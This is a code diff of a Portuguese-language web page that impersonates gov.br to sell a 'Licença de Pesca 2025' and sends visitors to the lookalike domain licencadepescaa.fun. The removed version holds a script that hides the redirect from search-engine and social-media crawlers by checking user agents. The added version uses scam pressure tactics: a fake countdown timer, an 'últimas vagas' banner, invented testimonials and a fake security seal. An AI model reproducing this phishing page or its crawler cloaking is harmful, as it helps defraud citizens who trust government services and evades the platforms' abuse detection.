@@ -2,89 +2,67 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Solicitar Licença de Pescador</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>Licença de Pesca 2025</title>
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, sans-serif;
-      background-color: #f5f5f5;
       margin: 0;
-      padding: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #f4f4f4;
       color: #333;
+      max-width: 360px;
+      margin: auto;
     }
-
     header {
-      background-color: #002855;
-      color: #fff;
-      padding: 1rem;
-      text-align: center;
-    }
-
-    header h1 {
-      margin: 0;
-      font-size: 1.5rem;
-    }
-
-    .container {
-      max-width: 600px;
-      margin: 2rem auto;
-      padding: 2rem;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    .title {
-      font-size: 1.4rem;
-      font-weight: bold;
-      margin-bottom: 2rem;
-      text-align: center;
-      color: #002855;
-    }
-
-    .btn {
-      background-color: #004085;
+      background-color: #00264d;
       color: white;
-      border: none;
-      padding: 1rem 3rem;
-      font-size: 1.2rem;
-      border-radius: 30px;
-      cursor: pointer;
-      font-weight: 600;
-      transition: background 0.3s ease;
-      margin: 1.5rem 0 2rem 0;
-      box-shadow: 0 4px 12px rgba(0, 64, 133, 0.3);
-    }
-
-    .btn:hover {
-      background-color: #002752;
-    }
-
-    .section {
-      margin-top: 1rem;
-      text-align: left;
-      width: 100%;
-    }
-
-    .section h2 {
-      font-size: 1.2rem;
-      color: #004085;
-      margin-bottom: 0.5rem;
-    }
-
-    .section p {
-      font-size: 1rem;
-      line-height: 1.6;
-    }
-
-    footer {
+      padding: 20px;
       text-align: center;
-      font-size: 0.8rem;
-      color: #666;
-      margin-top: 2rem;
+    }
+    .urgente {
+      background-color: #e60000;
+      color: #fff;
+      font-weight: bold;
+      text-align: center;
+      padding: 10px;
+      font-size: 18px;
+    }
+    .countdown {
+      text-align: center;
+      font-size: 22px;
+      font-weight: bold;
+      color: #e60000;
+      margin: 20px 0;
+    }
+    .container {
+      padding: 20px;
+    }
+    .botao {
+      display: block;
+      background-color: #007bff;
+      color: white;
+      text-align: center;
+      padding: 15px;
+      text-decoration: none;
+      border-radius: 5px;
+      margin: 20px 0;
+      font-size: 18px;
+    }
+    .selo {
+      display: block;
+      text-align: center;
+      margin: 20px auto;
+    }
+    .depoimentos {
+      background: #fff;
+      border-radius: 5px;
+      padding: 10px;
+      margin-bottom: 15px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .nome {
+      font-weight: bold;
+      margin-bottom: 5px;
     }
   </style>
 </head>
@@ -92,52 +70,51 @@
   <header>
     <h1>gov.br • Serviços ao Cidadão</h1>
   </header>
+  <div class="urgente">ÚLTIMAS VAGAS DISPONÍVEIS!</div>
+
+  <div class="countdown" id="timer">05:00</div>
 
   <div class="container">
-    <div class="title">Solicitar Licença de Pescador Amador ou Esportivo</div>
+    <p>
+      A Licença de Pesca 2025 já está disponível! Garanta agora mesmo seu direito de pescar legalmente em todo o território nacional. Processo rápido, seguro e 100% online.
+    </p>
+    <a href="https://licencadepescaa.fun/inicio/" class="botao">Solicitar Licença Agora</a>
 
-    <button id="btnSolicitar" class="btn">Iniciar Solicitação</button>
+    <img src="https://i.imgur.com/tUWVKqV.png" alt="Selo de Segurança" class="selo" width="120">
 
-    <div class="section">
-      <h2>📌 O que é?</h2>
-      <p>
-        A pesca amadora ou esportiva é uma atividade de natureza não comercial. Isso significa que o pescado
-        obtido não pode ser vendido, mas pode ser utilizado para consumo próprio, ornamentação ou pesca esportiva (pesque e solte).
-      </p>
+    <div class="depoimentos">
+      <div class="nome">João Marcos - MG</div>
+      <div>"Achei que era difícil, mas em 2 minutos estava com a minha licença pronta. Muito obrigado!"</div>
     </div>
-
-    <div class="section">
-      <h2>📋 Validade e requisitos</h2>
-      <p>
-        A licença tem validade de <strong>1 ano</strong> em todo o território nacional e deve ser emitida
-        diretamente pelo órgão responsável (SAP/MAPA).
-      </p>
+    <div class="depoimentos">
+      <div class="nome">Carlos Henrique - PA</div>
+      <div>"Pesco todo ano, mas dessa vez fiz com antecedência! Plataforma confiável e fácil de usar."</div>
+    </div>
+    <div class="depoimentos">
+      <div class="nome">Silvana R. - SP</div>
+      <div>"Fiquei na dúvida, mas entrei no link e deu tudo certo. Agora tô legalizada!"</div>
     </div>
   </div>
 
-  <footer>
-    Esta é uma página informativa para facilitar o acesso ao processo de solicitação de licença.
-  </footer>
-
   <script>
-    const bots = [
-      'Googlebot', 'AdsBot-Google', 'Mediapartners-Google',
-      'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
-      'YandexBot', 'facebookexternalhit', 'Twitterbot'
-    ];
+    let minutos = 4;
+    let segundos = 59;
+    const timer = document.getElementById("timer");
 
-    const isBot = bots.some(bot => navigator.userAgent.includes(bot));
-
-    if (!isBot) {
-      document.getElementById('btnSolicitar').addEventListener('click', () => {
-        window.location.href = "https://licencadepescaa.fun/inicio/";
-      });
-    } else {
-      const btn = document.getElementById('btnSolicitar');
-      btn.style.backgroundColor = '#888';
-      btn.style.cursor = 'not-allowed';
-      btn.innerText = 'Acesso restrito';
+    function atualizarContador() {
+      const m = minutos.toString().padStart(2, '0');
+      const s = segundos.toString().padStart(2, '0');
+      timer.innerText = `${m}:${s}`;
+      if (minutos === 0 && segundos === 0) return;
+      if (segundos === 0) {
+        minutos--;
+        segundos = 59;
+      } else {
+        segundos--;
+      }
     }
+
+    setInterval(atualizarContador, 1000);
   </script>
 </body>
 </html>
